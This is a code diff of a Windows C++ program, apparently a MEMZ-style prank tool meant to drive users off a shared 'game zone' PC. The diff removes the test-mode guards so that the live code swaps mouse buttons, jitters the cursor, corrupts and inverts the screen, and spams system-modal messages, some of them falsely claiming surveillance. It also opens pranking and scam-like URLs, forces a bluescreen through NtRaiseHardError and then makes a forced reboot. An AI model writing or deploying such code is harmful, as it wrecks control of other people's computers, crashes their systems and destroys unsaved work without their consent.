@@ -8,50 +8,42 @@
 #include <array>
 #include <vector>
 #include <functional>
-#include "payloads.h"
+#include <ctime>
+#include <chrono>
 
 #pragma comment(lib, "wininet") // fixes weird thing with wininet unresolved symbols
 #pragma comment(lib, "shell32")
 
-#define TIME_SECOND 1000
-#define MAX_RUNTIME 15
+// time scale changes how fast a minute actually is, default is 60 seconds, used for testing
+constexpr auto TIME_SCALE = 60;
+constexpr auto MAX_RUNTIME = 15;
+constexpr auto REBOOT_BLUESCREEN = 1;
+constexpr auto REBOOT_NORMAL = 0;
 
 std::random_device rd;
 std::mt19937 mt(rd());
 std::atomic<int> runtime = 0;
 
-//#define FORCELOOP
-#define TEST
-
-void reboot(void) 
+void reboot(short type)
 {
-#ifdef TEST
-	std::cout << "REBOOT" << std::endl;
-	exit(1);
-#else
-	// straight up copied from memz
-	// Try to force BSOD first
-	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
-	// This isn't even an exploit, it's just an undocumented feature.
-	HMODULE ntdll;
-	FARPROC RtlAdjustPrivilege;
-	FARPROC NtRaiseHardError;
-
-	{
-		if (!(ntdll = LoadLibraryA("ntdll"))) {
-			goto failcase;
-		}
-		RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
-		NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
-
-		if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
-			BOOLEAN tmp1; DWORD tmp2;
-			((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
-			((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc6942069, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
+	if (type == REBOOT_BLUESCREEN) {
+		// straight up copied from memz
+		// Try to force BSOD first
+		// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
+		// This isn't even an exploit, it's just an undocumented feature.
+		HMODULE ntdll;
+		FARPROC RtlAdjustPrivilege;
+		FARPROC NtRaiseHardError;
+		if (ntdll = LoadLibraryA("ntdll")) {
+			RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
+			NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
+			if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
+				BOOLEAN tmp1; DWORD tmp2;
+				((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
+				((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc6942069, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
+			}
 		}
 	}
-
-failcase:
 	// If the computer is still running, do it the normal way
 	HANDLE token;
 	TOKEN_PRIVILEGES privileges;
@@ -66,28 +58,27 @@ failcase:
 
 	// The actual restart
 	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
-#endif
 }
 
 void PayloadMessageBox(void)
 {
 	const LPCTSTR messages[]{
 		L"Please exit the game zone lol!",
-		L"Please stop play game!!!1!!",
-		L"Hehe funny joke plz leave now!",
-		L"LMAO please log out!",
-		L"Bruh...",
-		L"REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE",
-		L"Leave",
-		L"According to all known laws of aviation, there is no way that a bee should be able to fly. Its wings are too small to get its fat little body off the ground. The bee, of course, flies anyway. Because bees don’t care what humans think is impossible."
+		L"Smile. You are on camera.",
+		L"You are in violation of act four, section 103.83b of the BOCAL 'game zone' agreement act.",
+		L"Please log out.",
+		L"Game zone hours are from 1800 to 2300.",
+		L"you are not in the sudoers file.  This incident will be reported.",
+		L"Error."
 	};
 	std::uniform_int_distribution<int> dist(0, sizeof(messages) / sizeof(*messages) - 1);
 
 	for (;;) {
-		//std::thread([&]() {
-			MessageBox(nullptr, messages[dist(mt)], L"Wraning!", MB_OK | MB_ICONINFORMATION | MB_APPLMODAL);
+		// multithreading it breaks MessageBox
+		//std::thread([&]() { 
+		MessageBox(nullptr, messages[dist(mt)], L"Warning!", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
 		//}).detach();
-		std::this_thread::sleep_for(std::chrono::seconds(MAX_RUNTIME * 2 - runtime * 2));
+		std::this_thread::sleep_for(std::chrono::seconds((2 * MAX_RUNTIME) - runtime));
 	}
 }
 
@@ -97,7 +88,7 @@ void PayloadCursor(void)
 	std::uniform_int_distribution<int> dist(-1, 1);
 
 	// ~DONE~: scale less horribly early
-	//	Removed scaling, looks better with a static 1px movement every 20 sec
+	//	Removed scaling, looks better with a static 1px movement every 20 msec
 	for (;;) {
 		GetCursorPos(&cursor);
 		cursor.x += dist(mt);
@@ -139,38 +130,62 @@ void PayloadSwapMouseButtons(void)
 	}
 }
 
+void PayloadScreenWobble(void)
+{
+	HWND hwnd = GetDesktopWindow();
+	HDC hdc = GetWindowDC(hwnd);
+	auto x = GetSystemMetrics(SM_CXSCREEN);
+	auto y = GetSystemMetrics(SM_CYSCREEN);
+
+
+	for (;;) {
+		for (int i = 0; i < runtime; i++) {
+			BitBlt(hdc, 0, 0, x, y, hdc, -2, -2, SRCCOPY);
+			BitBlt(hdc, 0, 0, x, y, hdc, 2, 2, SRCCOPY);
+			std::this_thread::sleep_for(std::chrono::milliseconds(10));
+		}
+		std::this_thread::sleep_for(std::chrono::seconds(MAX_RUNTIME - runtime));
+	}
+}
+
+
 void PayloadScreenGlitch(void)
 {
 	auto x = GetSystemMetrics(SM_CXSCREEN);
 	auto y = GetSystemMetrics(SM_CYSCREEN);
-	std::uniform_int_distribution<int> dx(0, x);
 	std::uniform_int_distribution<int> dy(0, y);
-	std::uniform_int_distribution<int> cx(200, x);
-	std::uniform_int_distribution<int> cy(200, y);
+	std::uniform_int_distribution<int> dx(0, y);
 
 	int waittime = 15;
 
 	HWND hwnd = GetDesktopWindow();
 	HDC hdc = GetWindowDC(hwnd);
 	for (;;) {
-		BitBlt(hdc, dx(mt), dy(mt), cx(mt), cy(mt), hdc, dx(mt), dx(mt), SRCCOPY);
-		std::this_thread::sleep_for(std::chrono::seconds(static_cast<int>(waittime - std::floor(runtime / (MAX_RUNTIME / waittime)))));
+		int locx = dx(mt);
+		int locy = dy(mt);
+
+		BitBlt(hdc, 0, locy, x, 1, hdc, 0 , dy(mt), SRCCOPY);
+
+		std::this_thread::sleep_for(std::chrono::seconds(15 - runtime));
 	}
 }
 
-void PayloadInvert(void) {
+
+void PayloadInvertScreen(void) {
 	HWND hwnd = GetDesktopWindow();
 	HDC hdc = GetWindowDC(hwnd);
 	auto w = GetSystemMetrics(SM_CXSCREEN);
 	auto h = GetSystemMetrics(SM_CYSCREEN);
 
 	for (;;) {
-		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
+		if (runtime > 14) {
+			BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
+		}
 		std::this_thread::sleep_for(std::chrono::seconds(20 - runtime));
 	}
 }
 
-bool open_browser(const char* url, HWND parent = NULL)
+bool PayloadBrowser_open_browser(const char* url, HWND parent = NULL)
 {
 	// Try normally, with the default verb (which will typically be "open")
 	HINSTANCE result = ShellExecuteA(parent, NULL, url, NULL, NULL, SW_SHOWNORMAL);
@@ -189,18 +204,19 @@ void PayloadBrowser(void)
 {
 	LPCSTR searches[] = {
 		"https://www.google.com/search?q=epic+gamer+montag",
-		"https://www.google.com/search?q=doritos",
-		"https://www.google.com/search?q=mountain%20dew",
-		"https://www.google.com/search?q=lol%20epic%20combos",
-		"https://www.google.com/search?q=how%202%20b%20epic%20gamr",
-		"https://sites.google.com/a/ausdg.us/force-and-motion/the-entire-bee-movie-script",
-		"https://www.google.com/search?q=bedtime+stories",
-		"https://www.google.com/search?q=epic%20fortnite%20dance",
-		"http://csgojackpot.cash/"
+		"https://www.google.com/search?client=firefox-b-1-d&q=how+to+use+cheatengine+to+hack+csgo",
+		"https://youtu.be/dQw4w9WgXcQ",
+		"http://csgojackpot.cash/",
+		"http://www.dhmo.org/",
+		"http://fakeupdate.net/win8/",
+		"https://www.google.com/search?q=why+is+my+eye+twitching",
+		"https://www.google.com/search?q=do+i+have+a+virus&oq=do+i+have+a+virus",
+		"https://www.google.com/search?&q=help",
+		"http://42chan.ml/" // lol
 	};
 
 	for (;;) {
-		open_browser(searches[mt() % sizeof(searches) / sizeof(*searches)]);
+		PayloadBrowser_open_browser(searches[mt() % sizeof(searches) / sizeof(*searches)]);
 		std::this_thread::sleep_for(std::chrono::seconds(90 - (runtime * 2)));
 	}
 }
@@ -211,90 +227,39 @@ void PayloadBrowser(void)
 //  DONE bsod at end
 void LaunchPayloads(void)
 {
-	std::array<std::function<void(void)>, 7> payloads = {
+	std::array<std::function<void(void)>, 8> payloads = {
 			PayloadKeyboardInput,
 			PayloadSwapMouseButtons,
 			PayloadCursor,
+			PayloadScreenWobble,
 			PayloadBrowser,
 			PayloadScreenGlitch,
 			PayloadMessageBox,
-			PayloadInvert
+			PayloadInvertScreen
 	};
 
 	for (unsigned i = 0; i < payloads.size(); i++) {
 		std::thread(payloads.at(i)).detach();
-#ifdef TEST
-		std::this_thread::sleep_for(std::chrono::seconds(5));
-#else
-		std::this_thread::sleep_for(std::chrono::seconds(60));
-#endif
+		std::this_thread::sleep_for(std::chrono::seconds(3));
 	}
 }
 
-void displayIcon(HDC hdc, int ix, int iy, int w, int h, HICON icon) {
-	for (;;) {
-		DrawIcon(hdc, mt() % (w - ix), mt() % (h - iy), icon);
-	}
-}
+void PromptToLogOut(void) {
+	auto msgret = MessageBox(nullptr, L"The game zone is closed at this time. Please log out\nClicking 'OK' will log you out.\n\nDon't forget to save",
+		L"Game Over Man!", MB_OKCANCEL | MB_ICONINFORMATION | MB_SYSTEMMODAL | MB_SETFOREGROUND );
 
-void yesnobox(void) {
-	if (MessageBox(nullptr, L"The game zone is closed at this time.  Please log out", L"Warning", MB_OKCANCEL | MB_ICONHAND | MB_APPLMODAL) == IDCANCEL) {
-		for (int i = 0; i < 10; ++i) {
-			int ix = GetSystemMetrics(SM_CXICON) / 2;
-			int iy = GetSystemMetrics(SM_CYICON) / 2;
-			HWND hwnd = GetDesktopWindow();
-			HDC hdc = GetWindowDC(hwnd);
-			RECT r;
-			GetWindowRect(hwnd, &r);
-			int w = r.right - r.left;
-			int h = r.bottom - r.top;
-			HICON icon = LoadIcon(nullptr, IDI_ERROR);
-
-			std::thread(displayIcon, hdc, ix, iy, w, h, icon).detach();
-		}
-		std::this_thread::sleep_for(std::chrono::seconds(5));
-		reboot();
+	if (msgret == IDOK) {
+		reboot(REBOOT_NORMAL);
 	}
 }
 
 int main(void)
 {
-	runtime = 5;
-	PayloadCursor();
-#if 0
-
-	for (;;) {
-
-		time_t t = time(NULL);
-		tm tptr;
-		localtime_s(&tptr, &t);
-		if (tptr.tm_hour > 18 && (tptr.tm_hour < 23 || tptr.tm_wday == 6)) { // NOTE: this breaks if the user is able to change time
-#ifdef TEST
-			std::cout << "Game time" << std::endl;
-#ifdef FORCELOOP
-			goto startofend;
-#endif
-			std::this_thread::sleep_for(std::chrono::seconds(5));
-#else
-			std::this_thread::sleep_for(std::chrono::minutes(5));
-#endif
-			continue;
-		}
-#ifdef TEST
-		std::cout << "Not game time" << std::endl;
-#endif
-
-		std::thread(yesnobox).detach();
-		std::thread(LaunchPayloads).detach();
-		for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
-#ifdef TEST
-			std::cout << "running for: " << runtime << std::endl;
-			std::this_thread::sleep_for(std::chrono::seconds(5));
-#else
-			std::this_thread::sleep_for(std::chrono::seconds(60));
-#endif
-		}
-		reboot();
+	std::thread(PromptToLogOut).detach(); // go ahead and start fuckery, message box is just an easy way to log out early.
+	std::thread(LaunchPayloads).detach(); // said fuckery
+	for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
+		std::cout << "time is " << runtime << std::endl;
+		std::this_thread::sleep_for(std::chrono::minutes(1));
 	}
-#endif
+	reboot(REBOOT_BLUESCREEN);
 }
